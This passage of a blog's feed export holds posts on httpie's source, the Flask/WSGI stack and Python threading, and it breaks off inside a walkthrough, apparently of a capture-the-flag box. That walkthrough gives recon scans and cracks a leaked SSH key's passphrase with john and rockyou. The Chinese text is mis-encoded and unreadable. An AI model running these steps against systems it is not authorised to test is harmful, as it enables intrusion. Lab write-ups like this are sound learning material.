    <content type="html"><![CDATA[<h1 id="httpie-é¡¹ç›®æºç é˜…è¯»ï¼ˆ1ï¼‰"><a href="#httpie-é¡¹ç›®æºç é˜…è¯»ï¼ˆ1ï¼‰" class="headerlink" title="httpie é¡¹ç›®æºç é˜…è¯»ï¼ˆ1ï¼‰"></a>httpie é¡¹ç›®æºç é˜…è¯»ï¼ˆ1ï¼‰</h1><p>å…ˆæ”¾ä¸Šé¡¹ç›®é“¾æ¥<code>https://github.com/httpie/httpie</code></p><p>è¿™ä¸ªé¡¹ç›®å¤§æ¦‚å°±æ˜¯ä½œä¸ºä¸€ä¸ªcli-httpè®¿é—®å·¥å…·ï¼Œä¼šå¾—åˆ°æœåŠ¡å™¨è¿”å›çš„æ•°æ®å¤´</p><p>ä»¥ä¸‹æ˜¯é¡¹ç›®é¡µreadmeçš„ç®€å•ä»‹ç»</p><pre><code>HTTPie (pronounced aitch-tee-tee-pie) is a command-line HTTP client. Its goal is to make CLI interaction with web services as human-friendly as possible. HTTPie is designed for testing, debugging, and generally interacting with APIs &amp; HTTP servers. The http &amp; https commands allow for creating and sending arbitrary HTTP requests. They use simple and natural syntax and provide formatted and colorized output.</code></pre><p>é¡¹ç›®ç»“æ„:</p><pre><code>httpieâ”‚  .editorconfigâ”‚  .gitignoreâ”‚  AUTHORS.rstâ”‚  CHANGELOG.rstâ”‚  CODE_OF_CONDUCT.mdâ”‚  CONTRIBUTING.rstâ”‚  httpie.gifâ”‚  httpie.pngâ”‚  LICENSEâ”‚  Makefileâ”‚  MANIFEST.inâ”‚  README.rstâ”‚  requirements-dev.txtâ”‚  setup.cfgâ”‚  setup.pyâ”‚  tree.txtâ”‚  â”œâ”€.githubâ”‚  â”œâ”€ISSUE_TEMPLATEâ”‚  â”‚      bug_report.mdâ”‚  â”‚      feature_request.mdâ”‚  â”‚      other.mdâ”‚  â”‚      â”‚  â””â”€workflowsâ”‚          build.ymlâ”‚          â”œâ”€extrasâ”‚      brew-deps.pyâ”‚      httpie-completion.bashâ”‚      httpie-completion.fishâ”‚      httpie.rbâ”‚      â”œâ”€httpieâ”‚  â”‚  client.pyâ”‚  â”‚  compat.pyâ”‚  â”‚  config.pyâ”‚  â”‚  context.pyâ”‚  â”‚  core.pyâ”‚  â”‚  downloads.pyâ”‚  â”‚  models.pyâ”‚  â”‚  sessions.pyâ”‚  â”‚  ssl.pyâ”‚  â”‚  status.pyâ”‚  â”‚  uploads.pyâ”‚  â”‚  utils.pyâ”‚  â”‚  __init__.pyâ”‚  â”‚  __main__.pyâ”‚  â”‚  â”‚  â”œâ”€cliâ”‚  â”‚      argparser.pyâ”‚  â”‚      argtypes.pyâ”‚  â”‚      constants.pyâ”‚  â”‚      definition.pyâ”‚  â”‚      dicts.pyâ”‚  â”‚      exceptions.pyâ”‚  â”‚      requestitems.pyâ”‚  â”‚      __init__.pyâ”‚  â”‚      â”‚  â”œâ”€outputâ”‚  â”‚  â”‚  processing.pyâ”‚  â”‚  â”‚  streams.pyâ”‚  â”‚  â”‚  writer.pyâ”‚  â”‚  â”‚  __init__.pyâ”‚  â”‚  â”‚  â”‚  â”‚  â””â”€formattersâ”‚  â”‚          colors.pyâ”‚  â”‚          headers.pyâ”‚  â”‚          json.pyâ”‚  â”‚          __init__.pyâ”‚  â”‚          â”‚  â””â”€pluginsâ”‚          base.pyâ”‚          builtin.pyâ”‚          manager.pyâ”‚          registry.pyâ”‚          __init__.pyâ”‚          â””â”€tests    â”‚  conftest.py    â”‚  README.rst    â”‚  test_auth.py    â”‚  test_auth_plugins.py    â”‚  test_binary.py    â”‚  test_cli.py    â”‚  test_compress.py    â”‚  test_config.py    â”‚  test_defaults.py    â”‚  test_docs.py    â”‚  test_downloads.py    â”‚  test_errors.py    â”‚  test_exit_status.py    â”‚  test_httpie.py    â”‚  test_offline.py    â”‚  test_output.py    â”‚  test_redirects.py    â”‚  test_regressions.py    â”‚  test_sessions.py    â”‚  test_ssl.py    â”‚  test_stream.py    â”‚  test_tokens.py    â”‚  test_unicode.py    â”‚  test_uploads.py    â”‚  test_windows.py    â”‚      â”œâ”€client_certs    â”‚      client.crt    â”‚      client.key    â”‚      client.pem    â”‚          â”œâ”€fixtures    â”‚      test.bin    â”‚      test.json    â”‚      test.txt    â”‚      __init__.py    â”‚          â””â”€utils        â”‚  __init__.py        â”‚          â””â”€matching                parsing.py                test_matching.py                __init__.py</code></pre><p>å¯ä»¥çœ‹åˆ°é¡¹ç›®é‡‡ç”¨äº†Pythonçš„rstæ–‡æ¡£ï¼Œå·®ä¸å¤šæœ‰ç‚¹åƒMarkDownï¼Œä¸»è¦ç”¨äºpythonçš„åœ¨çº¿æ–‡æ¡£ï¼Œæ®è¯´å¦‚æœå†™ä»£ç çš„æ—¶å€™ç”¨ç‰¹æ®Šä»£ç æ ¼å¼ï¼Œå°±å¯ä»¥ç›´æ¥ç”Ÿæˆé¡¹ç›®çš„rstæ–‡æ¡£ååˆ†æ–¹ä¾¿ï¼ˆæš‚æ—¶æ²¡äº²æ‰‹è¯•éªŒè¿‡ï¼‰</p><p>è¿˜èƒ½çœ‹åˆ°setup.pyè¯´æ˜æ˜¯å¯ä»¥å®‰è£…çš„ï¼Œå…³äºsetup.pyæ˜¯å¹²å˜›çš„å¯ä»¥å‚è€ƒè¿™ç¯‡æ–‡ç« </p><p><a href="https://docs.python-guide.org/writing/structure/">https://docs.python-guide.org/writing/structure/</a></p><p>å¯ä»¥çœ‹åˆ°è¿™ä¸ªé¡¹ç›®æ˜¯é…å¥—äº†pytestè¿›è¡Œæµ‹è¯•çš„ï¼Œè¿™ä¸ªæ”¾åˆ°ä»¥åç¯‡å¹…ç ”ç©¶ã€‚</p><p>å…ˆè¿›httpieç›®å½•ï¼Œå¯ä»¥çœ‹<code>__main__</code>å’Œ <code>__init__</code></p><p><code>__init__.py</code>æ˜¯è¿™æ ·çš„</p><pre><code>&quot;&quot;&quot;HTTPie: command-line HTTP client for the API era.&quot;&quot;&quot;__version__ = &#39;2.5.0-dev&#39;__author__ = &#39;Jakub Roztocil&#39;__licence__ = &#39;BSD&#39;</code></pre><p>å¯ä»¥çœ‹åˆ°æ˜¯å†™äº†é¡¹ç›®ç‰ˆæœ¬ï¼Œä½œè€…ï¼Œé€‚ç”¨çš„Licence</p><p>å†çœ‹<code>__main__.py</code></p><pre><code>#!/usr/bin/env python&quot;&quot;&quot;The main entry point. Invoke as `http&#39; or `python -m httpie&#39;.This module can catch all the exception during runtime and perform as the main entry point of the whole program&quot;&quot;&quot;import sysdef main():    try:        from .core import main        exit_status = main()    except KeyboardInterrupt:        from httpie.status import ExitStatus        exit_status = ExitStatus.ERROR_CTRL_C  # import the pre-define constant value to represent KeyBoardInterrupt    sys.exit(exit_status.value)if __name__ == &#39;__main__&#39;:    main()</code></pre><p><code>main.py</code> çš„ä½œç”¨æ˜¯ä½œä¸ºç¨‹åºå…¥å£ï¼Œç”¨äºä½œä¸ºå¯¼ç«ç´¢æ¥å¯åŠ¨ç¨‹åºçš„å…¶ä»–æ¨¡å—åŒæ—¶åšä¸€ä¸ªtry-catchçš„åŒ…è£¹æ¥å¤„ç†ç¨‹åºè¿è¡Œæ—¶å‡ºç°çš„å¼‚å¸¸ã€‚</p><p>ä»åŒçº§ç›®å½•<code>core.py</code>å¼•å…¥ä¸»å‡½æ•°ï¼Œå¹¶ä¸”è¿è¡Œã€‚å¦‚æœé‡åˆ°é”®ç›˜ä¸­æ–­(Ctrl+C)å¼‚å¸¸å°±ä¼šä»åŒçº§ç›®å½•<code>status.py</code>ä¸­å¼•å…¥é€€å‡ºçŠ¶æ€ç±»ã€‚</p><p>å…ˆçœ‹<code>status.py</code>ä¸­çš„ä»£ç </p><pre><code>from enum import IntEnum, unique@uniqueclass ExitStatus(IntEnum):    &quot;&quot;&quot;Program exit status code constants.&quot;&quot;&quot;    SUCCESS = 0    ERROR = 1    ERROR_TIMEOUT = 2    # See --check-status    ERROR_HTTP_3XX = 3    ERROR_HTTP_4XX = 4    ERROR_HTTP_5XX = 5    ERROR_TOO_MANY_REDIRECTS = 6    PLUGIN_ERROR = 7    # 128+2 SIGINT    # &lt;http://www.tldp.org/LDP/abs/html/exitcodes.html&gt;    ERROR_CTRL_C = 130def http_status_to_exit_status(http_status: int, follow=False) -&gt; ExitStatus:    &quot;&quot;&quot;    Translate HTTP status code to exit status code.    (Relevant only when invoked with --check-status or --download.)    &quot;&quot;&quot;    if 300 &lt;= http_status &lt;= 399 and not follow:        # Redirect        return ExitStatus.ERROR_HTTP_3XX    elif 400 &lt;= http_status &lt;= 499:        # Client Error        return ExitStatus.ERROR_HTTP_4XX    elif 500 &lt;= http_status &lt;= 599:        # Server Error        return ExitStatus.ERROR_HTTP_5XX    else:        return ExitStatus.SUCCESS</code></pre><p>å¼•å…¥äº†pythonå†…ç½®çš„æšä¸¾ç±»ï¼Œä½¿ç”¨uniqueè£…é¥°å™¨ä¿®é¥°æšä¸¾ç±»<code>ExitStatus</code> ,åŒæ—¶æ³¨æ„åˆ°è¿™é‡Œæ˜¯ç±»çš„å®ä¾‹åŒ–ã€‚æšä¸¾ç±»çš„ç‰¹ç‚¹å°±æ˜¯å…¶ä¸­å±æ€§å€¼å¿…é¡»æ˜¯å”¯ä¸€ä¸èƒ½é‡å¤çš„ï¼Œä¹Ÿä¸èƒ½è¢«å¤–éƒ¨ä¿®æ”¹ã€‚åŠ ä¸Šuniqueè£…é¥°å™¨åï¼Œåˆ™åœ¨ç±»ä¸­å±æ€§æ˜¯å”¯ä¸€çš„ä¸èƒ½è¢«è¦†å†™ã€‚è¿™ä¸ªç±»ä¸­å®šä¹‰äº†ç¨‹åºé€€å‡ºå¸¸é‡å€¼ã€‚ä¸‹é¢çš„<code>def http_status_to_exit_status(http_status: int, follow=False) -&gt; ExitStatus:</code></p><p>å…¶å®æ˜¯å‡½æ•°æ³¨é‡Šï¼Œä¾‹å¦‚æ³¨é‡Šäº†å‚æ•°ä¸­<code>http_status</code>ç±»å‹æ˜¯<code>int</code>,æ³¨é‡Šäº†è¿”å›å€¼æ˜¯<code>ExitStatus</code>ã€‚å€¼å¾—æ³¨æ„çš„æ˜¯Pythonå¹¶ä¸å¯¹å‡½æ•°æ³¨é‡Šè¿›è¡Œæ£€æŸ¥ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œä¼ å…¥å€¼ç±»å‹ä¸æ˜¯æ³¨é‡Šç±»å‹æ—¶ï¼ŒPythonä¹Ÿä¸ä¼šè¿›è¡Œæç¤ºã€‚åŒæ—¶å‡½æ•°çš„æ³¨é‡Šä¿¡æ¯å­˜å‚¨åœ¨<code>å‡½æ•°å.__annotations__</code>è¿™æ ·ä¸€ä¸ªå­—å…¸ä¸­ã€‚å‡½æ•°çš„å†…å®¹å°±æ˜¯çœ‹<code>http_status</code>æ˜¯å¤šå°‘ï¼Œç„¶åè½¬æ¢æˆ<code>ExitStatus</code>ä¸­çš„å±æ€§å€¼(pre-defined constant)ã€‚</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;httpie-é¡¹ç›®æºç é˜…è¯»ï¼ˆ1ï¼‰&quot;&gt;&lt;a href=&quot;#httpie-é¡¹ç›®æºç é˜…è¯»ï¼ˆ1ï¼‰&quot; class=&quot;headerlink&quot; title=&quot;httpie é¡¹ç›®æºç é˜…è¯»ï¼ˆ1ï¼‰&quot;&gt;&lt;/a&gt;httpie é¡¹ç›®æºç é˜…è¯»ï¼ˆ1ï¼‰&lt;/h1&gt;&lt;p&gt;å…ˆæ”¾ä¸Šé¡¹ç›®é“¾æ¥&lt;code&gt;h</summary>
      
    
    
    
    <category term="Pythonå­¦ä¹ " scheme="https://zwh-china.github.io/categories/Python%E5%AD%A6%E4%B9%A0/"/>
    
    
  </entry>
  
  <entry>
    <title>Python Flaskå…¥é—¨(1)</title>
    <link href="https://zwh-china.github.io/2021/01/19/python-flask%E5%85%A5%E9%97%A81/"/>
    <id>https://zwh-china.github.io/2021/01/19/python-flask%E5%85%A5%E9%97%A81/</id>
    <published>2021-01-18T18:02:40.000Z</published>
    <updated>2021-04-20T19:50:34.000Z</updated>
    
    <content type="html"><![CDATA[<p>[toc]</p><h3 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h3><p>As I touched these things for the first time, I feel confused. So here I want to explain what are they and why we use them.</p><h3 id="Official-Introduction"><a href="#Official-Introduction" class="headerlink" title="Official Introduction"></a>Official Introduction</h3><p>WSGI</p><blockquote><p>WSGI is the Web Server Gateway Interface. It is a specification that describes how a web server communicates with web applications, and how web applications can be chained together to process one request.</p></blockquote><p>Gunicorn</p><blockquote><p>Gunicorn â€˜Green Unicornâ€™ is a Python WSGI HTTP Server for UNIX. Itâ€™s a pre-fork worker model. The Gunicorn server is broadly compatible with various web frameworks, simply implemented, light on server resources, and fairly speedy.</p></blockquote><p>Flask</p><blockquote><p>Flask is a lightweight <a href="https://wsgi.readthedocs.io/">WSGI</a> web application framework. It is designed to make getting started quick and easy, with the ability to scale up to complex applications. It began as a simple wrapper around <a href="https://www.palletsprojects.com/p/werkzeug/">Werkzeug</a> and <a href="https://www.palletsprojects.com/p/jinja/">Jinja</a> and has become one of the most popular Python web application frameworks.</p></blockquote><p>Werkzeug</p><blockquote><p><em>werkzeug</em> German noun: â€œtoolâ€. Etymology: <em>werk</em> (â€œworkâ€), <em>zeug</em> (â€œstuffâ€)</p><p>Werkzeug is a comprehensive <a href="https://wsgi.readthedocs.io/en/latest/">WSGI</a> web application library. It began as a simple collection of various utilities for WSGI applications and has become one of the most advanced WSGI utility libraries.</p></blockquote><p>Jinja</p><blockquote><p>Jinja2 is a full-featured template engine for Python. It has full Unicode support, an optional integrated sandboxed execution environment, widely used and BSD licensed.</p></blockquote><h3 id="About-Werkzeug"><a href="#About-Werkzeug" class="headerlink" title="About Werkzeug"></a>About Werkzeug</h3><p>As the official introduction says the Werzeug is a tool set based on the standard of WSGI. And Flask was developed based on the Werkzeug. If you try before use only Flask to hold a simple website, you may have noticed that the HTTP Response form the server indicates the remote server is Werkzeug. The reason behind this is that if you do not use Gunicorn or something else to act as webserver the Flask will use its simple built-in server. And of course since the Flask is based on Werkzeug the server inside Flask is also based on Werkzeug.</p><h3 id="About-Gunicorn"><a href="#About-Gunicorn" class="headerlink" title="About Gunicorn"></a>About Gunicorn</h3><h5 id="why-using-Nginx-Gunicorn"><a href="#why-using-Nginx-Gunicorn" class="headerlink" title="why using Nginx+Gunicorn"></a>why using Nginx+Gunicorn</h5><p>Often, we use the configuration like Nginx+Gunicorn+Flask just like Nginx+Apache+PHP. The Flask is not a webserver (though it has a simple built-in webserver) so it needs a web server like Nginx Apache or Gunicorn. Then you may still fell confused why we use Nginx? Shall we just use Gunicorn? Here I want to invoke an explanation from the StackOverFlow</p><blockquote><p>The reason why people run Nginx and Gunicorn together is that in addition to being a web server, Nginx can also proxy connections to Gunicorn which brings certain performance benefits, here is a pretty good answer that elaborates on those benefits: <a href="https://serverfault.com/questions/220046/why-is-setting-nginx-as-a-reverse-proxy-a-good-idea">https://serverfault.com/questions/220046/why-is-setting-nginx-as-a-reverse-proxy-a-good-idea</a></p></blockquote><p>Basically Nginx is good at dealing requests and have some of the advantages that using Gunicorn alone cannot achieve. As a result,it is often a better idea to use Nginx+Gunicorn.</p><h5 id="why-using-none-native-webserver-Flaskâ€™s-built-in-webserver"><a href="#why-using-none-native-webserver-Flaskâ€™s-built-in-webserver" class="headerlink" title="why using none-native webserver (Flaskâ€™s built-in webserver)"></a>why using none-native webserver (Flaskâ€™s built-in webserver)</h5><p>You may also be curious that why we need to use additional webserver like Gunicorn Webserver instead of using Flaskâ€™s built-in webserver. That is account for the efficiency and the stability of Flaskâ€™s simple webserver. The built-in webserver is simply <strong>not strong</strong> enough for production environment. As the official Flask website says</p><blockquote><p>While lightweight and easy to use, <strong>Flaskâ€™s built-in server is not suitable for production</strong> as it doesnâ€™t scale well and by default serves only one request at a time. Some of the options available for properly running Flask in production are documented here.</p></blockquote><h3 id="About-WSGI"><a href="#About-WSGI" class="headerlink" title="About WSGI"></a>About WSGI</h3><p>As for WSGI I copy an answer from the StackOverFlow since I also fell confused. :)</p><blockquote><p>Both CGI(Common Gateway Interface) and WSGI define standard interfaces that programs can use to handle web requests. The CGI interface is at a lower level than WSGI, and involves the server setting up environment variables containing the data from the HTTP request, with the program returning something formatted pretty much like a bare HTTP server response.</p><p>WSGI, on the other hand, is a Python-specific, <strong>slightly higher-level</strong> interface that allows programmers to write applications that are server-agnostic and which can be wrapped in other WSGI applications (middleware).</p><p><a href="https://stackoverflow.com/questions/4929626/what-are-wsgi-and-cgi-in-plain-english">Link</a></p></blockquote><p>The WSGI also include or support CGI. I find another ZhiHu passage may help you better understanding these confusing concepts.<a href="https://zhuanlan.zhihu.com/p/25013398">CGI-All In One</a> In the text author summarize that WSGI for Python and Servlet for Java are â€œone thingâ€ that share some same commons. One thing that needs to emphasis is that WSGI is not a Web Application, a framework, a Python module, a server, a software. It is more like a standard that set a rule that describes how web application communicate with the webserver.</p><p><img src="http://106.15.74.181/wp-content/uploads/2021/01/cgi-gateway.jpg"></p><blockquote><p>Picture from the author of ZhiHu passage above. Will remove if Infringing</p><p>For more about WSGI you can review this passage <a href="https://www.cnblogs.com/wangcoo/p/10018373.html">https://www.cnblogs.com/wangcoo/p/10018373.html</a></p></blockquote><h3 id="About-Jinja"><a href="#About-Jinja" class="headerlink" title="About Jinja"></a>About Jinja</h3><p>Jinja2 is a template engine for Flask to generate content</p><h3 id="In-general"><a href="#In-general" class="headerlink" title="In general"></a>In general</h3><p>Finally we can form a basic skeleton in our mind that.</p><p>Web-Request -&gt; Nginx -&gt; Gunicorn -&gt; WSGI -&gt;<strong>Flask</strong>&lt;- Jinja2 &lt;- Template</p><p>Flask (WebApplicationFramework) &lt;- Werkzeug (tool set) &lt;- WSGI (Standard)</p><h3 id="Reference-and-Suggest-to-View"><a href="#Reference-and-Suggest-to-View" class="headerlink" title="Reference and Suggest to View"></a>Reference and Suggest to View</h3><p>To write this passage I use many answers from the Internet no matter Zhihu StackOverFlow or CSDN. I want to deliver my thanks to their writings and kind answers. Many may not list here since the amount of reference I have used.</p><ul><li>  <a href="https://www.zhihu.com/column/c_1248388401738657792">Flaskå¼€å‘å­¦ä¹ </a></li><li>  <a href="https://blog.csdn.net/lovedingd/article/details/106685914">WSGIã€FlaskåŠWerkzeugä¸‰è€…ä¹‹é—´çš„å…³ç³»</a></li><li>  <a href="https://stackoverflow.com/questions/20766684/what-benefit-is-added-by-using-gunicorn-nginx-flask">What benefit is added by using Gunicorn + Nginx + Flask?</a></li><li>  <a href="https://stackoverflow.com/questions/4929626/what-are-wsgi-and-cgi-in-plain-english">What are WSGI and CGI in plain English?</a></li><li>  <a href="https://serverfault.com/questions/220046/why-is-setting-nginx-as-a-reverse-proxy-a-good-idea">Why is setting Nginx as a reverse proxy a good idea?</a></li><li>  <a href="https://www.cnblogs.com/my-blogs-for-everone/p/9804187.html">Python å·¥å…·åŒ… werkzeug åˆæ¢</a></li><li>  And the official websites of WSGI, Flask, Gunicorn, Werkzeug, Jinja</li></ul><h3 id="At-last"><a href="#At-last" class="headerlink" title="At last"></a>At last</h3><p>I am a beginner of Flask and such things and will definitely make lots of mistakes. I have tried my best to gather the reference and learn from the Internet. If you find any mistakes, please contact me through my E-mail:<a href="mailto:zwh_china@outlook.com">zwh_china@outlook.com</a> or QQ:2540649733(é›¨è¿‡å¤©æ™´&amp;ä¼è½äººç¦»)</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[toc]&lt;/p&gt;
&lt;h3 id=&quot;Introduction&quot;&gt;&lt;a href=&quot;#Introduction&quot; class=&quot;headerlink&quot; title=&quot;Introduction&quot;&gt;&lt;/a&gt;Introduction&lt;/h3&gt;&lt;p&gt;As I touched thes</summary>
      
    
    
    
    <category term="Pythonå­¦ä¹ " scheme="https://zwh-china.github.io/categories/Python%E5%AD%A6%E4%B9%A0/"/>
    
    
  </entry>
  
  <entry>
    <title>å…³äºPythonçš„å¤šçº¿ç¨‹å’Œå¤šè¿›ç¨‹-å…¥é—¨</title>
    <link href="https://zwh-china.github.io/2021/01/19/%E5%85%B3%E4%BA%8Epython%E7%9A%84%E5%A4%9A%E7%BA%BF%E7%A8%8B%E5%92%8C%E5%A4%9A%E8%BF%9B%E7%A8%8B-%E5%85%A5%E9%97%A8/"/>
    <id>https://zwh-china.github.io/2021/01/19/%E5%85%B3%E4%BA%8Epython%E7%9A%84%E5%A4%9A%E7%BA%BF%E7%A8%8B%E5%92%8C%E5%A4%9A%E8%BF%9B%E7%A8%8B-%E5%85%A5%E9%97%A8/</id>
    <published>2021-01-18T16:05:54.000Z</published>
    <updated>2021-04-20T19:50:34.000Z</updated>
    
    <content type="html"><![CDATA[<p>[toc]</p><p>1.Thread(çº¿ç¨‹)ï¼Œçº¿ç¨‹é€šä¿—çš„è¯´æ˜¯æ¯”è¿›ç¨‹å°çš„å•ä½ï¼Œä¸€ä¸ªCPUçš„coreä¸­å¯ä»¥åŒæ—¶å­˜åœ¨å¤šä¸ªThreadï¼ŒThreadçš„ç‰¹æ®Šä¹‹å¤„å°±åœ¨äºå½“é‡åˆ°è€—æ—¶ä¾‹å¦‚sleepçš„æ“ä½œæ—¶ï¼Œå¯ä»¥æŠŠè¿™ä¸ªThreadæŒ‚èµ·è½¬è€Œå»å¤„ç†åŒæ ¸å¿ƒçš„å¦ä¸€ä¸ªThreadã€‚</p><p>2.Process(è¿›ç¨‹)ï¼Œè¿›ç¨‹ä¸­å¯åˆ†ä¸ºå¤šä¸ªThreadï¼Œåœ¨Processå¼€å§‹å‰ä¼šåœ¨RAMåˆ’åˆ†å‡ºä¸€å®šçš„ç©ºé—´ï¼ŒæŠŠProcessçš„å¤šä¸ªThreadæ”¾åˆ°CPUçš„å¤šä¸ªæ ¸å¿ƒæˆ–ä¸€ä¸ªæ ¸å¿ƒå»è·‘ã€‚</p><p>æ‰€ä»¥å…¶å„æœ‰ç‰¹ç‚¹ï¼Œå¯¹äºMultithreadingå’ŒMultiprocessingæ¥è®²</p><blockquote><p><a href="https://www.youtube.com/watch?v=ecKWiaHCEKs">The Following List Ref From:Threading vs Multiprocessing in Python</a></p></blockquote><p>Threading:</p><ul><li>  A new thread is spawned within the existing process</li><li>  Starting a thread is faster than starting a process</li><li>  Memory is shared between all threads</li><li>  Mutexesï¼ˆäº’æ–¥é”ï¼‰often necessary to control access to shared data</li><li>  One GIL(Global Interpreter Lock) for all threads</li></ul><p>Multiprocessing:</p><ul><li>  A new process is started independent from the first process</li><li>  Starting a process is slower than starting a thread</li><li>  Memory is not shared between processes</li><li>  Mutexes not necessary (unless threading in the new process)</li><li>  One GIL(Global Interpreter Lock) for each process</li></ul><p>æ­¤å¤„è¿˜ç‰¹åˆ«è¯´æ˜ï¼ŒLinuxä¸­å­˜åœ¨çš„os.fork()ï¼Œä¹Ÿå°±æ˜¯å»ºç«‹å­è¿›ç¨‹ï¼Œforkå‡ºçš„å­è¿›ç¨‹å…¶å®å°±æ˜¯ä¸€ä¸ªæ–°çš„Processï¼Œé™¤äº†æä¸ªåˆ«å‚æ•°å¤–ï¼ŒåŒ…æ‹¬ä»£ç å†…å®¹å’Œçˆ¶è¿›ç¨‹éƒ½æ˜¯ä¸€è‡´çš„ï¼Œforkåçˆ¶å­è¿›ç¨‹ä¾¿æ˜¯å„è‡ªç‹¬ç«‹ï¼Œå†…å­˜è‡ªç„¶ä¹Ÿä¸æ˜¯å…±äº«ï¼Œå¯ä»¥è¯´å­è¿›ç¨‹æ˜¯çˆ¶è¿›ç¨‹çš„ä¸€ä¸ªå‰¯æœ¬ï¼Œæˆ‘æœ€æ—©çœ‹åˆ°è¿™ä¸ªæ¦‚å¿µè§‰å¾—å¾ˆå¥‡æ€ªã€‚æ—¢ç„¶å¦‚æ­¤ï¼Œå­è¿›ç¨‹ä¸ºä»€ä¹ˆä¸ä¼šä»å¤´å¼€å§‹å†æŠŠä»£ç è·‘ä¸€éï¼Œä¾‹å¦‚çˆ¶è¿›ç¨‹å…ˆprint(â€˜Hello Worldâ€™)ç„¶åå†forkä¸€ä¸ªå­è¿›ç¨‹ï¼Œé‚£ä¹ˆå­è¿›ç¨‹æ˜¯å¦ä¼šä¹Ÿæ‰“å°Hello Worldå‘¢ï¼Ÿç­”æ¡ˆæ˜¯ä¸ä¼šçš„ã€‚é‚£ä¹ˆä¸ºä»€ä¹ˆåˆè¯´å­è¿›ç¨‹æ˜¯çˆ¶è¿›ç¨‹çš„å‰¯æœ¬å‘¢ï¼ŸåŸå› å°±æ˜¯åœ¨forkæ—¶ï¼Œå­è¿›ç¨‹çˆ·ç»§æ‰¿äº†çˆ¶è¿›ç¨‹çš„ä»£ç å’Œæ•°æ®ï¼Œè¿™ä¸ªæ•°æ®åŒ…å«PCæŒ‡é’ˆå¯„å­˜å™¨çš„å€¼ï¼Œè¿™æ ·å­è¿›ç¨‹å¼€å§‹çš„ä½ç½®ä¹Ÿå°±æ˜¯ä¸»è¿›ç¨‹æ‰§è¡Œforkå‡½æ•°çš„ä¸‹ä¸€è¡Œè¯­å¥ã€‚</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[toc]&lt;/p&gt;
&lt;p&gt;1.Thread(çº¿ç¨‹)ï¼Œçº¿ç¨‹é€šä¿—çš„è¯´æ˜¯æ¯”è¿›ç¨‹å°çš„å•ä½ï¼Œä¸€ä¸ªCPUçš„coreä¸­å¯ä»¥åŒæ—¶å­˜åœ¨å¤šä¸ªThreadï¼ŒThreadçš„ç‰¹æ®Šä¹‹å¤„å°±åœ¨äºå½“é‡åˆ°è€—æ—¶ä¾‹å¦‚sleepçš„æ“ä½œæ—¶ï¼Œå¯ä»¥æŠŠè¿™ä¸ªThreadæŒ‚èµ·è½¬è€Œå»å¤„ç†åŒæ ¸å¿ƒçš„å¦ä¸€ä¸ªThreadã€‚&lt;/p&gt;
&lt;p</summary>
      
    
    
    
    <category term="Pythonå­¦ä¹ " scheme="https://zwh-china.github.io/categories/Python%E5%AD%A6%E4%B9%A0/"/>
    
    
  </entry>
  
  <entry>
    <title>è®°ä¸€æ¬¡ShellShockå’Œkernalææƒæ¼æ´</title>
    <link href="https://zwh-china.github.io/2020/11/26/%E8%AE%B0%E4%B8%80%E6%AC%A1shellshock%E5%92%8Ckernal%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/"/>
    <id>https://zwh-china.github.io/2020/11/26/%E8%AE%B0%E4%B8%80%E6%AC%A1shellshock%E5%92%8Ckernal%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/</id>
    <published>2020-11-25T18:23:49.000Z</published>
    <updated>2021-04-20T19:50:34.000Z</updated>
    
    <content type="html"><![CDATA[<p>[toc]</p><p>åŸYouTubeè§†é¢‘ï¼š<a href="https://www.youtube.com/watch?v=TS%5C_yfDqr%5C_3s">https://www.youtube.com/watch?v=TS\_yfDqr\_3s</a></p><h2 id="ç¬¬ä¸€æ­¥nampç«¯å£æ‰«æ"><a href="#ç¬¬ä¸€æ­¥nampç«¯å£æ‰«æ" class="headerlink" title="ç¬¬ä¸€æ­¥nampç«¯å£æ‰«æ"></a>ç¬¬ä¸€æ­¥nampç«¯å£æ‰«æ</h2><pre><code>nmap -sC -sV -oN nmap/initial IP</code></pre><h2 id="ç¬¬äºŒæ­¥niktoç½‘ç«™æ‰«æ"><a href="#ç¬¬äºŒæ­¥niktoç½‘ç«™æ‰«æ" class="headerlink" title="ç¬¬äºŒæ­¥niktoç½‘ç«™æ‰«æ"></a>ç¬¬äºŒæ­¥niktoç½‘ç«™æ‰«æ</h2><pre><code>nikto -h &quot;http://xxx.xxx.xxx.xxx&quot; tee xxx.log</code></pre><h2 id="ç¬¬ä¸‰æ­¥ç½‘ç«™ç›®å½•æ‰«æ"><a href="#ç¬¬ä¸‰æ­¥ç½‘ç«™ç›®å½•æ‰«æ" class="headerlink" title="ç¬¬ä¸‰æ­¥ç½‘ç«™ç›®å½•æ‰«æ"></a>ç¬¬ä¸‰æ­¥ç½‘ç«™ç›®å½•æ‰«æ</h2><pre><code>gobuster dir -u http://xxx.xxx.xxx.xxx -w /usr/share/wordlists/dirbuster/xxxè§†é¢‘ä¸­è€å¤–é€šè¿‡æ‰«ç›®å½•æ‰«åˆ°/backupã€‚è¿›å…¥åå‘ç°æ˜¯å¤‡ä»½çš„SSH RSAè¯ä¹¦ï¼Œä½¿ç”¨ssh -i xxx user@ip # xxx is the file you save RSA Encrypt Licence</code></pre><p>ä½†åœ¨è§†é¢‘ä¸­æœªè·æˆåŠŸï¼Œä»éœ€è¦è¾“å…¥rsaå¯†é’¥ã€‚æ­¤æ—¶ ä»–å†³å®šç”¨openwallç ´è§£RSAåŠ å¯†ï¼Œåœ¨æ­¤æ—¶ä»–å› ä¸ºlocateä¸åˆ°rockyouæ›´æ–°äº†ä¸€ä¸‹db</p><pre><code>sudo updatedb</code></pre><p>åœ¨ç­‰å¾…çš„åŒæ—¶gobusteræ‰«æåˆ°ä¸€ä¸ª/secretç›®å½•ï¼Œè¿›å…¥å‘ç°æ˜¯ä¸€ä¸ªä¹Œé¾Ÿçš„pngå›¾ç‰‡ï¼Œä»–å°†å…¶wgetä¸‹è½½å</p><pre><code>strings turtle.png</code></pre><p>è¯•å›¾æ‰¾åˆ°éšè—å†…å®¹ä½†æ²¡æˆåŠŸï¼Œæ­¤æ—¶ä»–å»openwallæ‰¾åˆ°äº†ssh2johnï¼Œä½¿ç”¨</p><pre><code>python3 ssh2john.py id_rsa &gt;xxx.logjohn xxx.log --wordlist=rockyou.txt</code></pre><p>ç 